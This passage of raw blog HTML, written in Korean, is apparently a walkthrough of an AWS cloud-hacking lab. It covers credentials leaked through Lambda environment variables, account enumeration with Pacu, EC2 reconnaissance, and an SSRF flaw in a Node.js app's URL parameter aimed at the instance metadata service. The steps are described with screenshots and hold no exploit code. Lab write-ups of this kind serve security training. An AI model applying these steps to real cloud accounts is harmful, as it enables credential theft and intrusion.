tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">ACCESS_KEY</span></span><span class=\"token punctuation\">></span></span><span class=\"token plain-text\">\n[+] Secret (ENV): EC2_SECRET_KEY_ID= </span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">ACCESS_SECRET_KEY</span></span><span class=\"token punctuation\">></span></span></code></pre></div>\n<ul>\n<li>대상 람다 함수는 AWS 계정에 존재하고 lambda 함수의 환경변수에 일부 하드 코딩이 되었이기 떄문에 이는 AWS Security Credential이 있는 것을 확인할 수 있습니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 37.77777777777778%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAYAAAD5nd/tAAAACXBIWXMAAAsTAAALEwEAmpwYAAAB7ElEQVQozz2QSW/aUACEX5sQDCEQMLaxzWLg4QW8YCANZGFJkzZqSpYqyiE95NYql3Lo/9dXkUo5faPRaKQZsVxdM50tmS+u+DRdsFpcEi6/01m/MBpNCaMJrhfj+Qk9NyLop0TxBN+fkBw5XD/nuXoqEAwtlJyFiIdn9KMpQXiM9FKS0TmePyaJpgzHc7zgiG3GqgdUjS6aId+p6l2EKCNECSGKZLJVRDqeEyUnRPGCMFwwGl0QTZZkKm1KhzaVaotSuY6qOahV541bb8vDSgMlr7F/YJDb18nmNMRms+Hx8YnXzT2//qx5/b3m/OWV8s+/fF5esL59YL5YcXNzy93dD66+fKPRcmm0vDe2O30Ms42mN1HyOuJ4OmeYnnB5b3HzbPP1QdLqRWhOTLsTYdoumtHBMOWbrupt8gWT4mGDQslG1R12MmXEhyJ728lVQyK9CcWSRMoZ/cGcYXJKzxlQs332FJ2MorG7p7KTUfmYqZDNGeQKNbKKiRDq+4+ZrIoIBhM63RDXH9IPx/T7KU40oxovkDLCC0Z0ZIR0E1w/xfNTknRGGM2IxwPSszLB+ACzqaPkagjZi6lZXey6i2n3aNQl5VbIbnuEYThY9R6q1sS0JaYlqTdcGk0Py/ZoSYvh+T7JaRG7/b/wH4sC5g/zF08nAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"4\"\n        title=\"4\"\n        src=\"/static/5516bb3559eef107fcf086c5cc07eb45/37523/4.png\"\n        srcset=\"/static/5516bb3559eef107fcf086c5cc07eb45/e9ff0/4.png 180w,\n/static/5516bb3559eef107fcf086c5cc07eb45/f21e7/4.png 360w,\n/static/5516bb3559eef107fcf086c5cc07eb45/37523/4.png 720w,\n/static/5516bb3559eef107fcf086c5cc07eb45/e1031/4.png 803w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>사용자 Solus에게 <code class=\"language-text\">lambda:InvokeFunction</code> 권한 이 없기 때문에 직접 Lambda 함수를 호출하려는 시도가 동작하지를 않습니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 25.555555555555554%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAYAAABFA8wzAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAyElEQVQY03WQWQ+CMBCE8SASD8BaqNxyWYxySXzQaPz/v2pMm5gI6sNkt+1+m5kq9jYDZSkcr4DoCY2hmwE2VgJ1RjGamBhP17IO9b4X9S3FJBH2RYcka5DxM6K4RLg7YbFyfwJCE5X03j5nFG3O0HZPHKsr6vYBfrigau4o65vsmbMHtRPpnNAdLJbJNOIsFn85FLEcjyPnHeK0lsOuX8jIW4+DObmEN1YMbW5DGRtfkXsODRLCWAfQTV9Cwo3QUnd78BD89x0vE9J44mP6XSgAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"5\"\n        title=\"5\"\n        src=\"/static/ada45d5e440be5b12d3473496dd033c2/37523/5.png\"\n        srcset=\"/static/ada45d5e440be5b12d3473496dd033c2/e9ff0/5.png 180w,\n/static/ada45d5e440be5b12d3473496dd033c2/f21e7/5.png 360w,\n/static/ada45d5e440be5b12d3473496dd033c2/37523/5.png 720w,\n/static/ada45d5e440be5b12d3473496dd033c2/65654/5.png 872w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<h3 id=\"lambda-기능-나열-및-분석\" style=\"position:relative;\"><a href=\"#lambda-%EA%B8%B0%EB%8A%A5-%EB%82%98%EC%97%B4-%EB%B0%8F-%EB%B6%84%EC%84%9D\" aria-label=\"lambda 기능 나열 및 분석 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Lambda 기능 나열 및 분석</h3>\n<ul>\n<li>lambda 환경 변수에서 유출된 AWS Credential 을 PACU <code class=\"language-text\">run aws__enum_account</code> 사용해서 추가로 나열하여 어떤 Credential 이 있는지 확인하였습니다.</li>\n<li>해당 Credential을 확인해보면 IAM 사용자는 wrex라는 것을 확인할수 있습니다.</li>\n<li>해당 Wrex의 정보를 토대로 IAM에서 사용할 수 있는 서비스를 확인하였습니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 93.88888888888887%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAATCAYAAACQjC21AAAACXBIWXMAAAsTAAALEwEAmpwYAAAC/0lEQVQ4y12U53LbQBCD6RbHVtStXq0ukaIaVajiHuf9nwiZbyl6nPzgUHfiYbEA9pyJt9VkutN8+SR/cVSh1FW9ObF3s+0pX3hUtT6ydTrbUKPlqvU4VSpT18/7kpLpmu3z++IqI2e3/63Z8qRl8Kz98Y+6/YUWwbMGo0Cr9au9g82b1rt3+ybYvCrYvtmeOw1tTYFiuaerm5yc6fyg4XitibfTYvVkDADhDftSpa/H7kz+/KDRZKORuzEgzgzGgcrVoZyLlJzLtC6vsxFDgKgaHj7VGyy1WD2rN1xqtX6xtt3pTrvDp6azvbH050ctgxcDpaC1epmOnpghh2aLk+nHGqCxu1W5OrAi/Mc6ZgfTan2sX6ma7hJl3SVKur0ryvFmeztMW93BwrRAk7jV3NmUTm9u3/HUmhO1O76Klb4qtaEVhUgm15SDu1T2zu2g3djd2AHXD1WpjzQYrUwGdKRtGM4WRwOBfe6hrZvbfGTKavNqYPPlyZyEnefvjR17tcb47PiLFQKUtnk8P9Rogo4DAyVKDrZPZwfL4Tb8UH+4MkBa9M8s6GCze7c1BsKWb+gom28bMxw2l+OWAcU5mBEXmLJXrg0tm4AxAESHiFEQeQBM55oqlHq6/1WRQ2X0oBoMaY/DgFCMQ7RHbAg8RWEJQwxiUky7i1TEkExFsQm/hEaXKH+hOQgb4kWx4WQdBfz8sNfq+DaalsPvweY3LbMm2LAxYD+00MMYc2C63r6ZVBAgbolkJQL8l+FJ9Zb7jeHOHKR9GBJmdAQIZrzJ5EOxq2S6rpvbBzmb8MPiQWUuB9oDmHzFucQE2KPt/05TjNsmkazq+kdeDrqhBQwBbrQ9Y4jLMGQSiBL/EWqKUWDsbZUvdJTJtezqcpxkNNNoQTyoynXFhBBemM5XT9YSkjAArt2bp6+5hwRFcBqHvwDj2CA8AqNrHJu6xebc8vxoRYP4zDrKLbNOuxYfxMfy0nnAGSEuiGy+ZYYwTrRWqY1sHwkIMZcHD7Hincm3TMu/QsgunJHa4XgAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"6\"\n        title=\"6\"\n        src=\"/static/7c79d4446da6d59f0b639a1e228b0948/37523/6.png\"\n        srcset=\"/static/7c79d4446da6d59f0b639a1e228b0948/e9ff0/6.png 180w,\n/static/7c79d4446da6d59f0b639a1e228b0948/f21e7/6.png 360w,\n/static/7c79d4446da6d59f0b639a1e228b0948/37523/6.png 720w,\n/static/7c79d4446da6d59f0b639a1e228b0948/0955e/6.png 901w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>생각보다 많은 서비스에 대해 권한을 갖고 있는 것을 확인할 수 있습니다. 실행중인 EC2 인스턴스가 있는지를 확인하겠습니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 75.55555555555556%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAPCAYAAADkmO9VAAAACXBIWXMAAAsTAAALEwEAmpwYAAABSElEQVQ4y6WUW2+CQBCF17s1FhEQtUUFRQG5iogVbZs+9f//otPMNCa1T4IPswE2fDmz58wKSTZgzLd4Hhjo9SdotlXUGjLqzWGlEu3uCEFUoLh8w/OP6DzpEPVBdSApslYxgrjAbOGj1dEeU9hoKVhYIaLkAnMZgd4fApJCanWXfaIvvULUJN6oCmWF1PJqvQOd519QFaighWDuNmdD/kPKQgX9QAptJ+XIUMvk8rWu0HvB3PKL4WJquJiZAT+T24PhHN3ebYTugbIpYXyGH74hiE7w/Bz7wxe77vo5xtN1qVwyMEk/ECZnBmU5wc78TZ/Y6PbG5V0mU6gcL4PjHbBxM9ibHRTNuhnFu1r+Hb0TZzFJ3xHGBdbOHuqoPIyBNGoEsOwE9iaFFxxZLV0YimaWnmsxVE1I8gyyMoeqL1kZnR3dPlVy+AOqh1/X1NZ1XgAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"7\"\n        title=\"7\"\n        src=\"/static/7a2ced0401f6bb877805f69d1a1b7261/37523/7.png\"\n        srcset=\"/static/7a2ced0401f6bb877805f69d1a1b7261/e9ff0/7.png 180w,\n/static/7a2ced0401f6bb877805f69d1a1b7261/f21e7/7.png 360w,\n/static/7a2ced0401f6bb877805f69d1a1b7261/37523/7.png 720w,\n/static/7a2ced0401f6bb877805f69d1a1b7261/42d54/7.png 858w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>전체 지역을 대상으로 ec2에서 사용되고 있는 전체적인 정보를 확인하였습니다. 필요한 정보들을 추려내기위해 세세한 정보들은 aws query 문을 통해 손수 검사를 진행하였습니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 28.888888888888886%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAYAAADDl76dAAAACXBIWXMAAAsTAAALEwEAmpwYAAABaElEQVQY0y2Qy27aUBRFb+y2qtqowRhqNcEE/Gjsi19J/ABbNthAIMkgijLrtP//DavFYrC0B2cfaWmLTXskzWvWmwOb7plu80S8e2dcPJM+lv0tSgqWZduzKlua9Z6yPNC9RHz8ndK+GcSpj6KOEHM7ZBGeHnZYTsTd3T3GPOLL2EHTJmhDk8Ep9WnPcDRFH8/Q9BnGzS8sqTNxNLSRgaIOEfX6iaxoesOq3tHUW7zqiP6wJY5ykocSGTz2pmnekOVNb5llHfU+5PWPyWo/Jk4XKKqOmFkxY8PlxpTcziOmVsxn5QpVfEWoGkL8OOflmW8I8f3MFUL8RIghQmgonwaI5aolLxoOx7d+ozwt8asDZvXKsqhZVR1BlGE5C+a2xP0d4vkJtp0Qpibl8ZK8G3DrTLhQhghfJnh+iOedihGBjLDjgut4he8F+DLGcSVSxvgyYhEkPb5/T5K5lNtrirWJ61lc/N/wH8nKsB44gEbtAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"8\"\n        title=\"8\"\n        src=\"/static/5dd966a09ac3fe04eca9bcb058233438/37523/8.png\"\n        srcset=\"/static/5dd966a09ac3fe04eca9bcb058233438/e9ff0/8.png 180w,\n/static/5dd966a09ac3fe04eca9bcb058233438/f21e7/8.png 360w,\n/static/5dd966a09ac3fe04eca9bcb058233438/37523/8.png 720w,\n/static/5dd966a09ac3fe04eca9bcb058233438/44fd6/8.png 789w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>인스턴스의 상태와 동작중인 서비스르 확인하였지만 기존의 인스턴스르 제외하고는 정확한 서비스 정보를 확인할 수 없었습니다.</li>\n</ul>\n<h3 id=\"ec2-내에서-동작중인-웹-서비스-파악-및-분석\" style=\"position:relative;\"><a href=\"#ec2-%EB%82%B4%EC%97%90%EC%84%9C-%EB%8F%99%EC%9E%91%EC%A4%91%EC%9D%B8-%EC%9B%B9-%EC%84%9C%EB%B9%84%EC%8A%A4-%ED%8C%8C%EC%95%85-%EB%B0%8F-%EB%B6%84%EC%84%9D\" aria-label=\"ec2 내에서 동작중인 웹 서비스 파악 및 분석 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>EC2 내에서 동작중인 웹 서비스 파악 및 분석</h3>\n<ul>\n<li>좀더 정확한 서비스를 파악하기 위해서 새로운 인스턴스를 시작하고 실행 중인 서비스가 있는지 확인하겠습니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 34.44444444444444%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAYAAAAIy204AAAACXBIWXMAAAsTAAALEwEAmpwYAAABE0lEQVQoz31RTU+DQBTcflJqtVRKt1uxUihQkALVkIp48GC8mSZ68mBi4834/69jdu0aGqqH2c2+tzNvJo/UmwO0OwbUIwpFNaCoIzTbOmoNDbx3CP/1yM/Rh3lxiWVSYDzxhCgn8TohxyCk94tDYuUaKRe4U8uO4XgrTK0I9jwVmJwHYOYC7MwXf8SgHSRX3mRPvdZHGN0gLx7hBxmus3tsP77wvv3E88sbnjav0I0ZSF1Dp0uFeKN1WnVYtr5MbrHOH7AIMzjuCnF6hzgtEERr8Y7iXAzlbilz0e0x4bQiKKcMRzZc/wozJwFlnoh+oploKcPd8sZ7sSuRy4J8uwadw5yGGOiWIPNoPJYkS6G/lvINDYqp9j8BcYEAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"9\"\n        title=\"9\"\n        src=\"/static/f724cd7fdb961cfebf2e184fcc51f95a/37523/9.png\"\n        srcset=\"/static/f724cd7fdb961cfebf2e184fcc51f95a/e9ff0/9.png 180w,\n/static/f724cd7fdb961cfebf2e184fcc51f95a/f21e7/9.png 360w,\n/static/f724cd7fdb961cfebf2e184fcc51f95a/37523/9.png 720w,\n/static/f724cd7fdb961cfebf2e184fcc51f95a/0098c/9.png 775w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>EC2 인스턴스에 연결된 보안 그룹은 웹 서비스가 실행중인 상태로 나타납니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 38.888888888888886%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAYAAAD5nd/tAAAACXBIWXMAAAsTAAALEwEAmpwYAAABSElEQVQoz4WQS0/CQBSFpx3KQ+iDAqVMKaURaXm4QIOkSkBaxeLGlYkmro07///qmJlaNCbC4kxu7pz57rlDZhcRNnGK+dUSq/UW0U2MbZKCJc/wl4/YrBIsojVmlxHiZIfbzQPS3RPiJEUU3eHlPcTbZwevH0OcBQGIRA3UG3202RBm04dheqiqDqikglIdVGlALtQhF0xR5yKyASLrIJIFQizIclv4CD8qVRuq7sBxR+j5UzhuiBOVgVADfGAGzGpp38v7upDERY0MKCbJOmoaw2iyAOuG6PbGIm1myu5/4P9rD+QpPf8crjeBzQJY9kBAW/YAHSdAq30KpdQ8ChXAfA3mjrC4vkc4nqPXn0IzXAEpVSwUyy3k3oNAbigUG+IBVUzUNAdKuQlV76Kqdvbr/l75EJRwEE/BYdmE78+VNAH5++BYwi8uucJ8QY4r9gAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"10\"\n        title=\"10\"\n        src=\"/static/ffcb78e788e575c97fb85e179b5d55ac/37523/10.png\"\n        srcset=\"/static/ffcb78e788e575c97fb85e179b5d55ac/e9ff0/10.png 180w,\n/static/ffcb78e788e575c97fb85e179b5d55ac/f21e7/10.png 360w,\n/static/ffcb78e788e575c97fb85e179b5d55ac/37523/10.png 720w,\n/static/ffcb78e788e575c97fb85e179b5d55ac/7fee5/10.png 781w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>특정 서버의 연결하기 위해 공용 IP 주소를 확인하였습니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 16.11111111111111%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAYAAACTWi8uAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAxUlEQVQI1x3Oy06DQBiAUZbGxLpqgVqKAaJIsQPzzwUoBaMxJrJxWX3/9/iMrs72BEfl0XJCNR3Oz4g9491IdP4iVSd043lWnqoWxIy0esB3M8ZOaNOxXBKWnx3TR8HNak9QVgbfvyF2pqwsTwfH4eDI9Qt55YiinHWYEcYF8d0DmzD/d7sr2cQZ948xebUlLVKuriMCLQPT9IqxHSJ/W4/RhmhcyNoeaYSj0tS1otUWLQ7vB6ztEWNYLiGf32vG94TVbcIv/1BcnlOFPHoAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"11\"\n        title=\"11\"\n        src=\"/static/5c23d07689ff38bd017888c5b48eded4/37523/11.png\"\n        srcset=\"/static/5c23d07689ff38bd017888c5b48eded4/e9ff0/11.png 180w,\n/static/5c23d07689ff38bd017888c5b48eded4/f21e7/11.png 360w,\n/static/5c23d07689ff38bd017888c5b48eded4/37523/11.png 720w,\n/static/5c23d07689ff38bd017888c5b48eded4/41d3b/11.png 774w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>80 port에서 실행되는 웹 애플리케이션이 있는 것을 추정할 수 가 있고 이에 따라 Node js 에러메시지를 확인한 결과 <code class=\"language-text\">URL</code> 이라는 파라미터 값에 문자열이 아닌 NULL 값이 들어가 있어 에러가 난것을 확인할 수있으며 이에 따라 <code class=\"language-text\">URL</code> 파라미터에 특정 문자열 타입을 입력해 보았습니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 38.888888888888886%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAYAAAD5nd/tAAAACXBIWXMAAAsTAAALEwEAmpwYAAABT0lEQVQoz5WPW2vCQBSE84vaxtREpSZuGo1asPSh/cUVkzyLzUUSUxXxQcVgvOBlylmsBFsoPfBxhmV3dkZ4KDMUiirEnIybWwnSvQJFKaJQKEGWFdyJOYii9Ac5SFIeeVmBUKs38fb6gkazhUa9BrNuotmo4bn1BKNqoqJXUWEGdKaC6Y/QNA2MVaDrBIPONKiqDsMwUSyVIViWhXb7HbbtwLZtOI6DTqcD27bQ7XbR633A9Tz4vg/PI7wzLlzXRRAE8Ak/4PeEyWSCMIwQxzHi+BNRFGE4HGI8HmO5XGKxWCBNU6xWKdbrNWe73eJ4PHKuRyCjfr/PoRREGIb8ZzojPRqNMJ1OkSQJ5vM5Nz2dThfTLMJgMMjU8LiRd65ImtLOZrNL2s1mg8PhwNOQKfGtecLdbscrZOvQpoekae/3+x8Vr40ulfHP+S1V1vALB4wKcLV2z00AAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"12\"\n        title=\"12\"\n        src=\"/static/04d0488e3bb8d89c8ea645a71a7ab1db/37523/12.png\"\n        srcset=\"/static/04d0488e3bb8d89c8ea645a71a7ab1db/e9ff0/12.png 180w,\n/static/04d0488e3bb8d89c8ea645a71a7ab1db/f21e7/12.png 360w,\n/static/04d0488e3bb8d89c8ea645a71a7ab1db/37523/12.png 720w,\n/static/04d0488e3bb8d89c8ea645a71a7ab1db/1cfc2/12.png 900w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 26.111111111111107%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAYAAABFA8wzAAAACXBIWXMAAAsTAAALEwEAmpwYAAABAklEQVQY033M/06CABiFYa5I0UhzyFar7kBABPyV1yrO5gyX3oCEkHM5VJzQeBvW6i/7tmfnbGf7hOqNjKLcIddvKYoSpZLEdaWKJFUol68QxRKFgnhZUeT+4RG5rlCryQiabjIY9LDsLpZpYBgGva6Fbds0WzaaZmA0NRpqE11XUVUVs6VjWSbtdp9GQyf/0e706XSfEIbDIePnMa47Y7GYM3JGTKcvzFwXx3GYTCa8zufExyNxHJ8dDoffnouiiCjasd/vEdbrNZ63ZLPZEIYhK9//7kFAEIR4vs/xzYPlkvfVio/tlv9OSNOU0+lEnkmSnHuef1I+k4TsZ89lWXbRF+8VLWhfL3mIAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"13\"\n        title=\"13\"\n        src=\"/static/7399373fdb0c330f2b2fd397d54662ec/37523/13.png\"\n        srcset=\"/static/7399373fdb0c330f2b2fd397d54662ec/e9ff0/13.png 180w,\n/static/7399373fdb0c330f2b2fd397d54662ec/f21e7/13.png 360w,\n/static/7399373fdb0c330f2b2fd397d54662ec/37523/13.png 720w,\n/static/7399373fdb0c330f2b2fd397d54662ec/fd84e/13.png 1056w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<h3 id=\"ssrf-취약점-분석및-imds-기능을-이용한-정보-탈취\" style=\"position:relative;\"><a href=\"#ssrf-%EC%B7%A8%EC%95%BD%EC%A0%90-%EB%B6%84%EC%84%9D%EB%B0%8F-imds-%EA%B8%B0%EB%8A%A5%EC%9D%84-%EC%9D%B4%EC%9A%A9%ED%95%9C-%EC%A0%95%EB%B3%B4-%ED%83%88%EC%B7%A8\" aria-label=\"ssrf 취약점 분석및 imds 기능을 이용한 정보 탈취 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>SSRF 취약점 분석및 IMDS 기능을 이용한 정보 탈취</h3>\n<ul>\n<li>해당 웹 서버가 SSRF 취약점이 존재하는지를 확인하기 위해서 <code class=\"language-text\">link address</code> 를 입력 함으로써 출력되는 결과를 확인하였습니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 27.22222222222222%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAYAAABFA8wzAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA5ElEQVQY03WN7UrDMBSGe3Oz1aa2bsxfIl7qhI4KDga7CLPOpU3aNWlh+EgzygT1wMP7ceCcIBEpaTZHiIQ4FqTpPUkiuI0T7mJBGEbchBFRFHrGnKUPLOZzFoslL89PPGZLYpExm8UEq9cVxVvBbrcjz3M2m3eKomCdr9lut5RlyX6/pywvjF7KUaX3E1JKPqQk6LqOqqo4HA6cTidqXWOMQSmFtZbP45FO16CU50spdNPw3wTGaLS+Mh4z2nj92U+7xjS0bYvrnX9orcO5C2MOpnAprv4X1nrtXc8wDJzP5z/5BoheVa8iTJauAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"14\"\n        title=\"14\"\n        src=\"/static/1285c66d47051286d1f7a3e4c4e94476/37523/14.png\"\n        srcset=\"/static/1285c66d47051286d1f7a3e4c4e94476/e9ff0/14.png 180w,\n/static/1285c66d47051286d1f7a3e4c4e94476/f21e7/14.png 360w,\n/static/1285c66d47051286d1f7a3e4c4e94476/37523/14.png 